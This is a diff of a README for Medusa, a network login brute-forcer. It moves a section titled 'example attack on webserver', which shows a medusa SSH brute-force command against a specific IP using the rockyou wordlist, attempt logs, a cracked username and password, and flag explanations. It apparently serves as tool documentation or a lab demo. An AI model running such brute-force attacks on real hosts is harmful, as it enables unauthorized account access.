@@ -1,5 +1,6 @@
 # Medusa
 
+<img width="653" alt="medusa" src="https://user-images.githubusercontent.com/86956564/131167407-2514fedc-2f28-474e-b8ae-2d30d172dfe4.png">
 
 * NAME
        MEDUSA - Parallel Network Login Auditor
@@ -13,6 +14,29 @@
        services which allow remote authentication as possible. The author considers following items to  some  of  the  key
        features of this application:
 
+### example attack on webserver 
+```
+┌──(kali㉿kali)-[~]
+└─$ medusa -h 143.110.251.159 -u king -P /usr/share/wordlists/rockyou.txt -M ssh                                                                        255 ⨯
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+ACCOUNT CHECK: [ssh] Host: 143.110.251.159 (1 of 1, 0 complete) User: king (1 of 1, 0 complete) Password: 123456 (1 of 14344393 complete)
+ACCOUNT CHECK: [ssh] Host: 143.110.251.159 (1 of 1, 0 complete) User: king (1 of 1, 0 complete) Password: 12345 (2 of 14344393 complete)
+ACCOUNT CHECK: [ssh] Host: 143.110.251.159 (1 of 1, 0 complete) User: king (1 of 1, 0 complete) Password: 123456789 (3 of 14344393 complete)
+ACCOUNT CHECK: [ssh] Host: 143.110.251.159 (1 of 1, 0 complete) User: king (1 of 1, 0 complete) Password: password (4 of 14344393 complete)
+ACCOUNT CHECK: [ssh] Host: 143.110.251.159 (1 of 1, 0 complete) User: king (1 of 1, 0 complete) Password: ieee2021 (107 of 14344393 complete)
+ACCOUNT FOUND: [ssh] Host: 143.110.251.159 User: king Password: ieee2021 [SUCCESS]
+```
+
+### Explanation for above attack 
+
+*medusa -h 143.110.251.159 -u king -P /usr/share/wordlists/rockyou.txt -M ssh 
+* -h => Target hostname or IP address
+* -u => Target username
+* -P => Target passwords from the file [wordlist]
+* -M => Name of the module to execute [eg:- ssh,ftp]
+
+## help manual for medusa
        
        -h [TARGET]
               Target hostname or IP address.
@@ -117,30 +141,3 @@
               display  a "resume map". This map can then be supplied to the next run. For example, "medusa [OPTIONS PREVI‐
               OUSLY USED] -Z h6u1u2h8."
 
-### example attack on webserver 
-```
-┌──(kali㉿kali)-[~]
-└─$ medusa -h 143.110.251.159 -u king -P /usr/share/wordlists/rockyou.txt -M ssh                                                                        255 ⨯
-Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
-
-ACCOUNT CHECK: [ssh] Host: 143.110.251.159 (1 of 1, 0 complete) User: king (1 of 1, 0 complete) Password: 123456 (1 of 14344393 complete)
-ACCOUNT CHECK: [ssh] Host: 143.110.251.159 (1 of 1, 0 complete) User: king (1 of 1, 0 complete) Password: 12345 (2 of 14344393 complete)
-ACCOUNT CHECK: [ssh] Host: 143.110.251.159 (1 of 1, 0 complete) User: king (1 of 1, 0 complete) Password: 123456789 (3 of 14344393 complete)
-ACCOUNT CHECK: [ssh] Host: 143.110.251.159 (1 of 1, 0 complete) User: king (1 of 1, 0 complete) Password: password (4 of 14344393 complete)
-ACCOUNT CHECK: [ssh] Host: 143.110.251.159 (1 of 1, 0 complete) User: king (1 of 1, 0 complete) Password: iloveyou (5 of 14344393 complete)
-ACCOUNT CHECK: [ssh] Host: 143.110.251.159 (1 of 1, 0 complete) User: king (1 of 1, 0 complete) Password: princess (6 of 14344393 complete)
-ACCOUNT CHECK: [ssh] Host: 143.110.251.159 (1 of 1, 0 complete) User: king (1 of 1, 0 complete) Password: 1234567 (7 of 14344393 complete)
-ACCOUNT CHECK: [ssh] Host: 143.110.251.159 (1 of 1, 0 complete) User: king (1 of 1, 0 complete) Password: rockyou (8 of 14344393 complete)
-ACCOUNT CHECK: [ssh] Host: 143.110.251.159 (1 of 1, 0 complete) User: king (1 of 1, 0 complete) Password: football (41 of 14344393 complete)
-ACCOUNT CHECK: [ssh] Host: 143.110.251.159 (1 of 1, 0 complete) User: king (1 of 1, 0 complete) Password: secret (42 of 14344393 complete)
-ACCOUNT CHECK: [ssh] Host: 143.110.251.159 (1 of 1, 0 complete) User: king (1 of 1, 0 complete) Password: ieee2021 (107 of 14344393 complete)
-ACCOUNT FOUND: [ssh] Host: 143.110.251.159 User: king Password: ieee2021 [SUCCESS]
-```
-
-### Explanation for above attack 
-
-*medusa -h 143.110.251.159 -u king -P /usr/share/wordlists/rockyou.txt -M ssh 
-* -h => Target hostname or IP address
-* -u => Target username
-* -P => Target passwords from the file [wordlist]
-* -M => Name of the module to execute [eg:- ssh,ftp]
